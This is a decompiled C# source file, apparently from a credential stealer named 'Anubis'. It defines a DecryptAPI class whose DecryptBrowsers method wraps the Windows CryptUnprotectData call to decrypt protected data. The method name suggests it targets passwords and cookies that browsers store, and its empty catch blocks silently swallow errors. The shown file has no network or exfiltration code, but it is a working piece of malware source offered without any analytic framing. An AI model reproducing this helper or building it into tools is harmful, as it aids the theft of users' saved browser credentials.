using System;
using System.Runtime.InteropServices;

namespace Anubis
{
	// Token: 0x02000035 RID: 53
	internal class DecryptAPI
	{
		// Token: 0x06000195 RID: 405 RVA: 0x0000B9CC File Offset: 0x00009BCC
		public static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
		{
			DecryptAPI.DataBlob dataBlob = default(DecryptAPI.DataBlob);
			DecryptAPI.DataBlob dataBlob2 = default(DecryptAPI.DataBlob);
			DecryptAPI.DataBlob dataBlob3 = default(DecryptAPI.DataBlob);
			DecryptAPI.CryptprotectPromptstruct cryptprotectPromptstruct = new DecryptAPI.CryptprotectPromptstruct
			{
				cbSize = Marshal.SizeOf(typeof(DecryptAPI.CryptprotectPromptstruct)),
				dwPromptFlags = 0,
				hwndApp = IntPtr.Zero,
				szPrompt = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					if (cipherTextBytes == null)
					{
						cipherTextBytes = new byte[0];
					}
					dataBlob2.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
					dataBlob2.cbData = cipherTextBytes.Length;
					Marshal.Copy(cipherTextBytes, 0, dataBlob2.pbData, cipherTextBytes.Length);
				}
				catch
				{
				}
				try
				{
					if (entropyBytes == null)
					{
						entropyBytes = new byte[0];
					}
					dataBlob3.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
					dataBlob3.cbData = entropyBytes.Length;
					Marshal.Copy(entropyBytes, 0, dataBlob3.pbData, entropyBytes.Length);
				}
				catch
				{
				}
				DecryptAPI.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
				byte[] array = new byte[dataBlob.cbData];
				Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
				return array;
			}
			catch
			{
			}
			finally
			{
				if (dataBlob.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob.pbData);
				}
				if (dataBlob2.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob2.pbData);
				}
				if (dataBlob3.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob3.pbData);
				}
			}
			return new byte[0];
		}

		// Token: 0x06000196 RID: 406
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref DecryptAPI.DataBlob pCipherText, ref string pszDescription, ref DecryptAPI.DataBlob pEntropy, IntPtr pReserved, ref DecryptAPI.CryptprotectPromptstruct pPrompt, int dwFlags, ref DecryptAPI.DataBlob pPlainText);

		// Token: 0x0200006B RID: 107
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DataBlob
		{
			// Token: 0x0400013B RID: 315
			public int cbData;

			// Token: 0x0400013C RID: 316
			public IntPtr pbData;
		}

		// Token: 0x0200006C RID: 108
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct CryptprotectPromptstruct
		{
			// Token: 0x0400013D RID: 317
			public int cbSize;

			// Token: 0x0400013E RID: 318
			public int dwPromptFlags;

			// Token: 0x0400013F RID: 319
			public IntPtr hwndApp;

			// Token: 0x04000140 RID: 320
			public string szPrompt;
		}
	}
}
